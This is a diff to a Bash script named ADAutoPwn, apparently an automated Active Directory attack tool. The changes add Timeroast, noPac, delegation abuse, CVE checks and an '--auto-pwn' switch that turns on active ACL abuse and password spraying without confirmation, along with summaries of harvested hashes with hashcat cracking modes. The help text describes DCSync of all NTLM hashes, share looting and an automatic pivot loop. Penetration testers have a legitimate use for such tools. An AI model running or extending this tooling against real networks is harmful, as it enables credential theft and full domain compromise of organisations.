+    adcs_state=$(grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && echo "${C_RED}VULNERABLE${C_RESET}" || echo "${C_GREY}not flagged${C_RESET}")
+    admin_state=$([[ "$ntlm_n" -gt 0 || ${#OWNED_ADMIN[@]} -gt 0 ]] && echo "${C_GREEN}${C_BOLD}DOMAIN IMPACT${C_RESET}" || echo "${C_YELLOW}no domain dump yet${C_RESET}")
+
+    ui_panel_top
+    ui_kv "Target" "$DC_IP ${C_DIM}(${DC_FQDN:-?})${C_RESET}"
+    ui_kv "Domain" "${DOMAIN:-?}"
+    ui_kv "Auth mode" "$([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
+    ui_kv "Authenticated" "$auth_state"
+    ui_kv "Result" "$admin_state"
+    ui_kv "Loot dir" "$OUTDIR"
+    ui_panel_mid
+    ui_metric "Users enumerated" "$users_n"
+    ui_metric "AS-REP hashes" "$asrep_n" "hashcat -m 18200"
+    ui_metric "Timeroast hashes" "$time_n" "hashcat -m 31300"
+    ui_metric "Kerberoast hashes" "$kerb_n" "hashcat -m 13100"
+    ui_metric "NTLM hashes" "$ntlm_n" "DCSync / offline NTDS"
+    ui_metric "Cracked passwords" "$cracked_n"
+    ui_metric "ADCS" "$adcs_state"
+    ui_panel_bottom
 
     # Credential provenance map — where every secret/identity came from
     if [[ -s "$OUTDIR/credential_map.txt" || -s "$OUTDIR/valid_creds_map.txt" ]]; then
@@ -4093,7 +4490,7 @@ final_summary() {
     [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -qE ':::' "$OUTDIR/secretsdump.txt" 2>/dev/null && dd="$OUTDIR/secretsdump.txt"
     [[ -z "$dd" && -s "$OUTDIR/ntds_local.txt" ]] && grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null && dd="$OUTDIR/ntds_local.txt"
 
-    if [[ -s "$OUTDIR/found_passwords.txt" || -s "$OUTDIR/asrep_hashes.txt" || -s "$OUTDIR/kerberoast_hashes.txt" || -n "$dd" ]]; then
+    if [[ -s "$OUTDIR/found_passwords.txt" || -s "$OUTDIR/asrep_hashes.txt" || -s "$OUTDIR/timeroast_hashes.txt" || -s "$OUTDIR/kerberoast_hashes.txt" || -n "$dd" ]]; then
         section "FULL HARVEST · EVERYTHING RECOVERED"
 
         if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
@@ -4116,6 +4513,12 @@ final_summary() {
             detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
             while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
                 detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
+        fi
+
+        if [[ -s "$OUTDIR/timeroast_hashes.txt" ]]; then
+            detail "  ${C_BOLD}${C_YELLOW}» Timeroastable machine accounts${C_RESET} ${C_DIM}($(wc -l <"$OUTDIR/timeroast_hashes.txt") — hashcat -m 31300)${C_RESET}"
+            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1)
+                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done <"$OUTDIR/timeroast_hashes.txt"
         fi
 
         if [[ -n "$dd" ]]; then
@@ -4142,11 +4545,22 @@ final_summary() {
     finalize_loot
 
     echo
-    [[ -s "$OUTDIR/report.md" ]] && loot "Report → report.md   ·   Attack graph → graph.html"
-    ok "Done. Full log: $LOGFILE"
-    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
-    echo -e "${C_GREY}     Thanks for using ADAutoPwn · by ${C_RESET}${C_GREEN}${C_BOLD}${AUTHOR}${C_RESET}"
-    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
+    local report_state graph_state web_state
+    report_state=$([[ -s "$OUTDIR/report.md" ]] && echo "${C_GREEN}ready${C_RESET}" || echo "${C_YELLOW}missing${C_RESET}")
+    graph_state=$([[ -s "$OUTDIR/graph.html" ]] && echo "${C_GREEN}ready${C_RESET}" || echo "${C_YELLOW}not generated${C_RESET}")
+    web_state=$([[ "$WEB_UI" == "1" ]] && echo "http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}" || echo "${C_DIM}disabled${C_RESET}")
+
+    detail "${C_GREY}    ╔══════════════════════════════════════════════════════════════════╗${C_RESET}"
+    detail "${C_GREY}    ║${C_RESET} ${C_BOLD}${C_GREEN}ADAutoPwn complete${C_RESET} ${C_DIM}v${VERSION}${C_RESET}                                      ${C_GREY}║${C_RESET}"
+    detail "${C_GREY}    ╠══════════════════════════════════════════════════════════════════╣${C_RESET}"
+    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Report${C_RESET}      ${report_state}  ${C_DIM}$OUTDIR/report.md${C_RESET}"
+    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Graph${C_RESET}       ${graph_state}  ${C_DIM}$OUTDIR/graph.html${C_RESET}"
+    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Web UI${C_RESET}      ${web_state}"
+    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Log${C_RESET}         ${C_DIM}$LOGFILE${C_RESET}"
+    detail "${C_GREY}    ╠══════════════════════════════════════════════════════════════════╣${C_RESET}"
+    detail "    ${C_GREY}║${C_RESET} ${C_DIM}Rollback file:${C_RESET} ${ROLLBACK_FILE:-n/a}"
+    detail "    ${C_GREY}║${C_RESET} ${C_DIM}Run cleanup:${C_RESET}  $0 -t ${DC_IP:-<dc-ip>} -o '$OUTDIR' --cleanup"
+    detail "${C_GREY}    ╚══════════════════════════════════════════════════════════════════╝${C_RESET}"
 }
 
 _atexit() { [[ -n "$SUDO_KEEPALIVE_PID" ]] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null; }
@@ -4183,6 +4597,11 @@ assess_current_credential() {
     fi
 
     phase_auth_enum;    jitter
+    phase_attack_surface; jitter
+    phase_cve_checks;   jitter
+    phase_nopac_abuse;  jitter
+    phase_delegation_abuse; jitter
+    phase_precreated_computers; jitter
     phase_user_variants; jitter
     phase_share_loot;   jitter
     phase_secrets;      jitter
@@ -4247,6 +4666,8 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                 WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                 accounts. Off by default → ACLs only reported. Rollback-tracked
+  ${C_GREEN}--auto-pwn${C_RESET}     Alias for ${C_GREEN}--abuse --spray -y${C_RESET} (kept for convenience; the real
+                escalation switch is ${C_GREEN}--abuse${C_RESET})
   ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
                 original loot dir so it can read its rollback.log
   ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
@@ -4273,18 +4694,20 @@ ${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gate
   ${C_PURPLE}2${C_RESET}  Unauth enum    null/guest sessions, anon shares, RID brute, rpcclient,
                     LDAP anon bind, enum4linux-ng, kerbrute userenum
   ${C_PURPLE}3${C_RESET}  AS-REP roast   GetNPUsers against discovered users (no creds needed)
+  ${C_PURPLE}+${C_RESET}  Timeroast      MS-SNTP machine-account hashes → crack/pivot automatically
   ${C_PURPLE}4${C_RESET}  Validate+TGT   verify creds, request & cache a Kerberos TGT (reused after)
   ${C_PURPLE}5${C_RESET}  Auth enum      users, groups, pass policy, descriptions, shares, MAQ
-  ${C_PURPLE}+${C_RESET}  Secrets        LAPS & gMSA reads (auto-pivot on recovered hashes)
-  ${C_PURPLE}+${C_RESET}  ACL analysis   exploitable rights (GenericAll/WriteDACL/ForceChangePwd/…),
-                    optional abuse with --abuse
+  ${C_PURPLE}+${C_RESET}  Secrets        descriptions/GPP/LAPS/gMSA/dMSA reads (auto-pivot on recovered creds)
+  ${C_PURPLE}+${C_RESET}  Precreated PC  validate default computer-account passwords and pivot
+  ${C_PURPLE}+${C_RESET}  ACL/delegation exploitable rights + constrained delegation; ${C_GREEN}--abuse${C_RESET}
+                    turns them into creds/tickets/DCSync automatically
   ${C_PURPLE}+${C_RESET}  Trusts         domain/forest trusts, foreign principals, cross-forest roast
   ${C_PURPLE}6${C_RESET}  Kerberoast     GetUserSPNs for SPN accounts (+ cross-forest)
   ${C_PURPLE}7${C_RESET}  ADCS           certipy scan for ESC1..ESC16 vulnerable templates
   ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip ${C_BOLD}+ interactive graph.html${C_RESET}
   ${C_PURPLE}9${C_RESET}  DCSync         secretsdump -just-dc when privileges allow → all NTLM hashes
   ${C_PURPLE}+${C_RESET}  Report         consolidated ${C_BOLD}report.md${C_RESET} + tidy loot (enum/ · secrets/ · raw/)
-  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA / ESC1) is
+  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA / dMSA / ESC) is
                     re-fed and the whole chain repeats until nothing new appears
 
 ${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
@@ -4312,8 +4735,9 @@ ${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(tidied at the end — trophies 
    ├─ ${C_BOLD}graph.html${C_RESET}       interactive offline attack graph (auto-opens)
    ├─ users_all.txt · found_passwords.txt · credential_map.txt · *.ccache
    ├─ asrep_hashes.txt · kerberoast_hashes.txt · secretsdump.txt · rollback.log
+   ├─ timeroast_hashes.txt
    ├─ enum/           users/groups/policy, nmap, domain wordlist
-   ├─ secrets/        LAPS · gMSA · GPP · DPAPI · ACL dumps · trusts · ADCS · coercion
+   ├─ secrets/        LAPS · gMSA/dMSA · GPP · DPAPI · ACL dumps · trusts · ADCS · coercion
    ├─ shares/         looted share contents
    ├─ bloodhound/     collection .zip
    └─ raw/            misc intermediates
@@ -4341,6 +4765,7 @@ parse_args() {
             --creds-file) CREDS_FILE="$2"; shift 2;;
             --users-file) USERS_FILE="$2"; shift 2;;
             --spray) SPRAY_GEN=1; shift;;
+            --auto-pwn|--full-auto) DO_ABUSE=1; AUTO_YES=1; SPRAY_GEN=1; shift;;
             --crack) DO_CRACK=1; shift;;
             --no-crack) DO_CRACK=0; shift;;
             --abuse) DO_ABUSE=1; shift;;
@@ -4406,6 +4831,8 @@ main() {
     phase_hosts_time
     phase_unauth
     phase_asreproast
+    phase_timeroast
+    phase_cve_checks
 
     # --- Self-feed: resume context + ingest anything the operator found manually ---
     # Resume recovered passwords if reusing an existing loot dir
